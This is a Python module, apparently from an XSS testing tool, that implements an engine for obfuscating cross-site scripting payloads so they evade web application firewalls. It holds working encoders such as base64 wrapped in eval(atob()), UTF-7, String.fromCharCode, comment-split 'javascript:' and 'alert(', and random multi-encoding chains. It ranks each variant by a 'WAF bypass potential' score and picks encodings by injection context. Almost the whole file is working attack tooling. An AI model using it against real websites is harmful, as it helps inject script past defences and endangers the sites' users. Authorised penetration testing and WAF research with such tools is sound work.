"""Advanced encoding engine for WAF evasion."""

import re
import html
import urllib.parse
import base64
import binascii
import json
import secrets  # Secure random generator
from typing import List, Dict, Optional, Callable, Tuple
from dataclasses import dataclass
from enum import Enum
import logging


logger = logging.getLogger("xss_vibes.encoding")


class EncodingType(Enum):
    """Types of encoding techniques."""

    URL = "url"
    DOUBLE_URL = "double_url"
    HTML_ENTITIES = "html_entities"
    UNICODE = "unicode"
    HEX = "hex"
    OCTAL = "octal"
    BASE64 = "base64"
    UTF7 = "utf7"
    UTF16 = "utf16"
    JSON_UNICODE = "json_unicode"
    CSS_ENCODING = "css_encoding"
    JAVASCRIPT_ENCODING = "js_encoding"
    MIXED_CASE = "mixed_case"
    CHARACTER_SUBSTITUTION = "char_substitution"
    COMMENT_INSERTION = "comment_insertion"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"
    CONCATENATION = "concatenation"
    EVAL_ENCODING = "eval_encoding"
    FROMCHARCODE = "fromcharcode"


@dataclass
class EncodingResult:
    """Result of encoding operation."""

    original: str
    encoded: str
    encoding_type: EncodingType
    complexity: int  # 1-10 scale
    waf_bypass_potential: int  # 1-10 scale
    description: str


class AdvancedEncoder:
    """Advanced encoding engine for XSS payload obfuscation."""

    def __init__(self):
        """Initialize encoding engine."""
        self.encoding_functions: Dict[EncodingType, Callable] = {
            EncodingType.URL: self._url_encode,
            EncodingType.DOUBLE_URL: self._double_url_encode,
            EncodingType.HTML_ENTITIES: self._html_entities_encode,
            EncodingType.UNICODE: self._unicode_encode,
            EncodingType.HEX: self._hex_encode,
            EncodingType.OCTAL: self._octal_encode,
            EncodingType.BASE64: self._base64_encode,
            EncodingType.UTF7: self._utf7_encode,
            EncodingType.UTF16: self._utf16_encode,
            EncodingType.JSON_UNICODE: self._json_unicode_encode,
            EncodingType.CSS_ENCODING: self._css_encode,
            EncodingType.JAVASCRIPT_ENCODING: self._javascript_encode,
            EncodingType.MIXED_CASE: self._mixed_case_encode,
            EncodingType.CHARACTER_SUBSTITUTION: self._character_substitution,
            EncodingType.COMMENT_INSERTION: self._comment_insertion,
            EncodingType.WHITESPACE_MANIPULATION: self._whitespace_manipulation,
            EncodingType.CONCATENATION: self._concatenation_encode,
            EncodingType.EVAL_ENCODING: self._eval_encode,
            EncodingType.FROMCHARCODE: self._fromcharcode_encode,
        }

        # Character substitution mappings
        self.char_substitutions = {
            "(": ["&#40;", "&#x28;", "%28", "\\u0028"],
            ")": ["&#41;", "&#x29;", "%29", "\\u0029"],
            '"': ["&#34;", "&#x22;", "%22", "\\u0022", "&quot;"],
            "'": ["&#39;", "&#x27;", "%27", "\\u0027"],
            "<": ["&#60;", "&#x3C;", "%3C", "\\u003C", "&lt;"],
            ">": ["&#62;", "&#x3E;", "%3E", "\\u003E", "&gt;"],
            "/": ["&#47;", "&#x2F;", "%2F", "\\u002F"],
            "=": ["&#61;", "&#x3D;", "%3D", "\\u003D"],
            " ": ["&#32;", "&#x20;", "%20", "\\u0020", "+"],
            ":": ["&#58;", "&#x3A;", "%3A", "\\u003A"],
            ";": ["&#59;", "&#x3B;", "%3B", "\\u003B"],
        }

    def encode_payload(
        self, payload: str, encoding_type: EncodingType
    ) -> EncodingResult:
        """
        Encode payload using specified technique.

        Args:
            payload: Original XSS payload
            encoding_type: Type of encoding to apply

        Returns:
            EncodingResult with encoded payload and metadata
        """
        if encoding_type not in self.encoding_functions:
            raise ValueError(f"Unsupported encoding type: {encoding_type}")

        encoded = self.encoding_functions[encoding_type](payload)

        return EncodingResult(
            original=payload,
            encoded=encoded,
            encoding_type=encoding_type,
            complexity=self._calculate_complexity(encoding_type),
            waf_bypass_potential=self._calculate_bypass_potential(encoding_type),
            description=self._get_encoding_description(encoding_type),
        )

    def multi_encode(
        self, payload: str, encoding_chain: List[EncodingType]
    ) -> EncodingResult:
        """
        Apply multiple encoding techniques in sequence.

        Args:
            payload: Original payload
            encoding_chain: List of encoding types to apply in order

        Returns:
            EncodingResult with final encoded payload
        """
        current_payload = payload
        descriptions = []
        total_complexity = 0
        max_bypass_potential = 0

        for encoding_type in encoding_chain:
            result = self.encode_payload(current_payload, encoding_type)
            current_payload = result.encoded
            descriptions.append(result.description)
            total_complexity += result.complexity
            max_bypass_potential = max(
                max_bypass_potential, result.waf_bypass_potential
            )

        return EncodingResult(
            original=payload,
            encoded=current_payload,
            encoding_type=EncodingType.MIXED_CASE,  # Placeholder for multi-encoding
            complexity=min(10, total_complexity),
            waf_bypass_potential=min(
                10, max_bypass_potential + 2
            ),  # Bonus for multi-encoding
            description=f"Multi-encoding: {' -> '.join(descriptions)}",
        )

    def generate_evasion_variants(
        self, payload: str, count: int = 10
    ) -> List[EncodingResult]:
        """
        Generate multiple evasion variants of a payload.

        Args:
            payload: Original payload
            count: Number of variants to generate

        Returns:
            List of encoded variants
        """
        variants = []
        encoding_types = list(self.encoding_functions.keys())
        secure_random = secrets.SystemRandom()

        # Single encodings
        for encoding_type in secure_random.sample(
            encoding_types, min(count // 2, len(encoding_types))
        ):
            try:
                result = self.encode_payload(payload, encoding_type)
                variants.append(result)
            except Exception as e:
                logger.warning(f"Failed to encode with {encoding_type}: {e}")

        # Multi-encodings
        remaining = count - len(variants)
        for _ in range(remaining):
            chain_length = secure_random.randint(2, 4)
            encoding_chain = secure_random.sample(encoding_types, chain_length)
            try:
                result = self.multi_encode(payload, encoding_chain)
                variants.append(result)
            except Exception as e:
                logger.warning(f"Failed multi-encoding: {e}")

        # Sort by bypass potential
        variants.sort(key=lambda x: x.waf_bypass_potential, reverse=True)
        return variants[:count]

    # Encoding implementation methods

    def _url_encode(self, payload: str) -> str:
        """Standard URL encoding."""
        return urllib.parse.quote(payload, safe="")

    def _double_url_encode(self, payload: str) -> str:
        """Double URL encoding for advanced evasion."""
        encoded_once = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(encoded_once, safe="")

    def _html_entities_encode(self, payload: str) -> str:
        """Convert to HTML entities."""
        return html.escape(payload, quote=True)

    def _unicode_encode(self, payload: str) -> str:
        """Unicode escape encoding."""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    def _hex_encode(self, payload: str) -> str:
        """Hexadecimal encoding."""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def _octal_encode(self, payload: str) -> str:
        """Octal encoding."""
        return "".join(f"\\{ord(c):03o}" for c in payload)

    def _base64_encode(self, payload: str) -> str:
        """Base64 encoding with JavaScript wrapper."""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"eval(atob('{encoded}'))"

    def _utf7_encode(self, payload: str) -> str:
        """UTF-7 encoding for IE/Edge bypass."""
        try:
            return payload.encode("utf-7").decode("ascii")
        except:
            return payload

    def _utf16_encode(self, payload: str) -> str:
        """UTF-16 encoding."""
        encoded = payload.encode("utf-16be")
        return "".join(
            f"\\u{c:02x}{d:02x}" for c, d in zip(encoded[::2], encoded[1::2])
        )

    def _json_unicode_encode(self, payload: str) -> str:
        """JSON Unicode encoding."""
        return json.dumps(payload)[1:-1]  # Remove quotes

    def _css_encode(self, payload: str) -> str:
        """CSS encoding for style-based XSS."""
        return "".join(f"\\{ord(c):x} " for c in payload)

    def _javascript_encode(self, payload: str) -> str:
        """JavaScript string encoding."""
        encoded_chars = []
        for c in payload:
            if c.isalnum():
                encoded_chars.append(c)
            else:
                encoded_chars.append(f"\\x{ord(c):02x}")
        return "".join(encoded_chars)

    def _mixed_case_encode(self, payload: str) -> str:
        """Mixed case obfuscation."""
        result = ""
        for i, c in enumerate(payload):
            if c.isalpha():
                result += c.upper() if i % 2 == 0 else c.lower()
            else:
                result += c
        return result

    def _character_substitution(self, payload: str) -> str:
        """Random character substitution."""
        result = payload
        secure_random = secrets.SystemRandom()
        for char, substitutions in self.char_substitutions.items():
            if char in result:
                substitution = secure_random.choice(substitutions)
                result = result.replace(
                    char, substitution, 1
                )  # Replace only first occurrence
        return result

    def _comment_insertion(self, payload: str) -> str:
        """Insert HTML/JS comments for obfuscation."""
        comments = ["/**/", "<!---->", "/*x*/", "<!--x-->"]
        secure_random = secrets.SystemRandom()

        # Insert comments at strategic positions
        if "<script>" in payload.lower():
            payload = payload.replace(
                "<script>", f"<script{secure_random.choice(comments)}>"
            )
        if "javascript:" in payload.lower():
            payload = payload.replace(
                "javascript:", f"java{secure_random.choice(comments)}script:"
            )
        if "alert(" in payload.lower():
            payload = payload.replace(
                "alert(", f"alert{secure_random.choice(comments)}("
            )

        return payload

    def _whitespace_manipulation(self, payload: str) -> str:
        """Manipulate whitespace for evasion."""
        # Replace spaces with various whitespace alternatives
        whitespace_chars = ["\t", "\n", "\r", "\f", "\v", " "]
        secure_random = secrets.SystemRandom()

        result = ""
        for c in payload:
            if c == " ":
                result += secure_random.choice(whitespace_chars)
            else:
                result += c

        return result

    def _concatenation_encode(self, payload: str) -> str:
        """String concatenation obfuscation."""
        if len(payload) < 3:
            return payload

        # Split into random chunks and concatenate
        chunks = []
        secure_random = secrets.SystemRandom()
        i = 0
        while i < len(payload):
            chunk_size = secure_random.randint(1, 3)
            chunks.append(f"'{payload[i:i+chunk_size]}'")
            i += chunk_size

        return "+".join(chunks)

    def _eval_encode(self, payload: str) -> str:
        """Wrap in eval() for dynamic execution."""
        # Encode the payload as a string and wrap in eval
        escaped = payload.replace("\\", "\\\\").replace("'", "\\'")
        return f"eval('{escaped}')"

    def _fromcharcode_encode(self, payload: str) -> str:
        """String.fromCharCode() encoding."""
        char_codes = [str(ord(c)) for c in payload]
        return f"String.fromCharCode({','.join(char_codes)})"

    # Utility methods

    def _calculate_complexity(self, encoding_type: EncodingType) -> int:
        """Calculate complexity score for encoding type."""
        complexity_map = {
            EncodingType.URL: 2,
            EncodingType.DOUBLE_URL: 4,
            EncodingType.HTML_ENTITIES: 3,
            EncodingType.UNICODE: 5,
            EncodingType.HEX: 4,
            EncodingType.OCTAL: 4,
            EncodingType.BASE64: 6,
            EncodingType.UTF7: 7,
            EncodingType.UTF16: 6,
            EncodingType.JSON_UNICODE: 4,
            EncodingType.CSS_ENCODING: 5,
            EncodingType.JAVASCRIPT_ENCODING: 5,
            EncodingType.MIXED_CASE: 2,
            EncodingType.CHARACTER_SUBSTITUTION: 3,
            EncodingType.COMMENT_INSERTION: 4,
            EncodingType.WHITESPACE_MANIPULATION: 3,
            EncodingType.CONCATENATION: 6,
            EncodingType.EVAL_ENCODING: 7,
            EncodingType.FROMCHARCODE: 8,
        }
        return complexity_map.get(encoding_type, 5)

    def _calculate_bypass_potential(self, encoding_type: EncodingType) -> int:
        """Calculate WAF bypass potential for encoding type."""
        bypass_map = {
            EncodingType.URL: 3,
            EncodingType.DOUBLE_URL: 6,
            EncodingType.HTML_ENTITIES: 4,
            EncodingType.UNICODE: 7,
            EncodingType.HEX: 6,
            EncodingType.OCTAL: 6,
            EncodingType.BASE64: 8,
            EncodingType.UTF7: 9,
            EncodingType.UTF16: 7,
            EncodingType.JSON_UNICODE: 5,
            EncodingType.CSS_ENCODING: 7,
            EncodingType.JAVASCRIPT_ENCODING: 6,
            EncodingType.MIXED_CASE: 4,
            EncodingType.CHARACTER_SUBSTITUTION: 5,
            EncodingType.COMMENT_INSERTION: 6,
            EncodingType.WHITESPACE_MANIPULATION: 5,
            EncodingType.CONCATENATION: 8,
            EncodingType.EVAL_ENCODING: 9,
            EncodingType.FROMCHARCODE: 9,
        }
        return bypass_map.get(encoding_type, 5)

    def _get_encoding_description(self, encoding_type: EncodingType) -> str:
        """Get human-readable description of encoding type."""
        descriptions = {
            EncodingType.URL: "Standard URL encoding",
            EncodingType.DOUBLE_URL: "Double URL encoding",
            EncodingType.HTML_ENTITIES: "HTML entity encoding",
            EncodingType.UNICODE: "Unicode escape sequences",
            EncodingType.HEX: "Hexadecimal encoding",
            EncodingType.OCTAL: "Octal encoding",
            EncodingType.BASE64: "Base64 with eval wrapper",
            EncodingType.UTF7: "UTF-7 encoding",
            EncodingType.UTF16: "UTF-16 encoding",
            EncodingType.JSON_UNICODE: "JSON Unicode escapes",
            EncodingType.CSS_ENCODING: "CSS character encoding",
            EncodingType.JAVASCRIPT_ENCODING: "JavaScript string encoding",
            EncodingType.MIXED_CASE: "Mixed case obfuscation",
            EncodingType.CHARACTER_SUBSTITUTION: "Character entity substitution",
            EncodingType.COMMENT_INSERTION: "HTML/JS comment insertion",
            EncodingType.WHITESPACE_MANIPULATION: "Whitespace character substitution",
            EncodingType.CONCATENATION: "String concatenation",
            EncodingType.EVAL_ENCODING: "Dynamic evaluation wrapper",
            EncodingType.FROMCHARCODE: "String.fromCharCode encoding",
        }
        return descriptions.get(encoding_type, "Unknown encoding")


class ContextAwareEncoder:
    """Context-aware encoder that adapts to different injection contexts."""

    def __init__(self):
        """Initialize context-aware encoder."""
        self.base_encoder = AdvancedEncoder()

        # Context-specific encoding preferences
        self.context_preferences = {
            "html_attribute": [
                EncodingType.HTML_ENTITIES,
                EncodingType.UNICODE,
                EncodingType.CHARACTER_SUBSTITUTION,
            ],
            "javascript_string": [
                EncodingType.UNICODE,
                EncodingType.HEX,
                EncodingType.FROMCHARCODE,
                EncodingType.CONCATENATION,
            ],
            "css_context": [
                EncodingType.CSS_ENCODING,
                EncodingType.UNICODE,
                EncodingType.HEX,
            ],
            "url_parameter": [
                EncodingType.URL,
                EncodingType.DOUBLE_URL,
                EncodingType.UNICODE,
            ],
            "html_content": [
                EncodingType.HTML_ENTITIES,
                EncodingType.COMMENT_INSERTION,
                EncodingType.MIXED_CASE,
            ],
        }

    def encode_for_context(
        self, payload: str, context: str, variant_count: int = 5
    ) -> List[EncodingResult]:
        """
        Generate context-appropriate encoded variants.

        Args:
            payload: Original payload
            context: Injection context ('html_attribute', 'javascript_string', etc.)
            variant_count: Number of variants to generate

        Returns:
            List of context-appropriate encoded variants
        """
        preferred_encodings = self.context_preferences.get(context, list(EncodingType))

        variants = []

        # Generate single encoding variants
        for encoding_type in preferred_encodings[: variant_count // 2]:
            try:
                result = self.base_encoder.encode_payload(payload, encoding_type)
                variants.append(result)
            except Exception as e:
                logger.warning(f"Failed encoding for context {context}: {e}")

        # Generate multi-encoding variants
        remaining = variant_count - len(variants)
        secure_random = secrets.SystemRandom()
        for _ in range(remaining):
            chain_length = secure_random.randint(2, 3)
            encoding_chain = secure_random.sample(
                preferred_encodings, min(chain_length, len(preferred_encodings))
            )
            try:
                result = self.base_encoder.multi_encode(payload, encoding_chain)
                variants.append(result)
            except Exception as e:
                logger.warning(f"Failed multi-encoding for context {context}: {e}")

        return sorted(variants, key=lambda x: x.waf_bypass_potential, reverse=True)

    def detect_context(self, url: str, parameter: str) -> str:
        """
        Detect injection context based on URL and parameter.

        Args:
            url: Target URL
            parameter: Parameter name

        Returns:
            Detected context string
        """
        url_lower = url.lower()
        param_lower = parameter.lower()

        # Context detection heuristics
        if any(keyword in param_lower for keyword in ["style", "css"]):
            return "css_context"
        elif any(keyword in param_lower for keyword in ["script", "js", "callback"]):
            return "javascript_string"
        elif any(keyword in url_lower for keyword in [".css", "style="]):
            return "css_context"
        elif any(keyword in url_lower for keyword in [".js", "javascript:"]):
            return "javascript_string"
        elif "=" in url and parameter in url:
            return "url_parameter"
        else:
            return "html_attribute"  # Default safe assumption


# Global instances for easy access
advanced_encoder = AdvancedEncoder()
context_encoder = ContextAwareEncoder()


def encode_payload(payload: str, encoding_type: EncodingType) -> EncodingResult:
    """Convenience function for payload encoding."""
    return advanced_encoder.encode_payload(payload, encoding_type)


def generate_evasion_variants(payload: str, count: int = 10) -> List[EncodingResult]:
    """Convenience function for generating evasion variants."""
    return advanced_encoder.generate_evasion_variants(payload, count)


def encode_for_context(
    payload: str, context: str, variant_count: int = 5
) -> List[EncodingResult]:
    """Convenience function for context-aware encoding."""
    return context_encoder.encode_for_context(payload, context, variant_count)
